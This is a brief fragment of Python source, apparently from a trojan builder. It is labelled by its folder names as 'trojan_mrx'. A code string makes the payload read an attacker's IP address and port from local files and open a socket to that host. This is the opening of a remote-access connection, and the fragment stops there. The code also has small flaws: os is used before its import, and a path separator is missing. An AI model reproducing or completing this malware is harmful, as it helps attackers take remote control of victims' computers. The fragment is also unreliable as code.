...
code="""
login=os.getlogin()
ip=open("C://Users//"+str(login)+"Downloads//trojan_mrx//source//trojan_licen//ip.txt").read()
port=open("C://Users//"+str(login)+"Downloads//trojan_mrx//source//trojan_licen//port.txt").read()
import os
import socket
s=socket.socket()
host=str(ip)
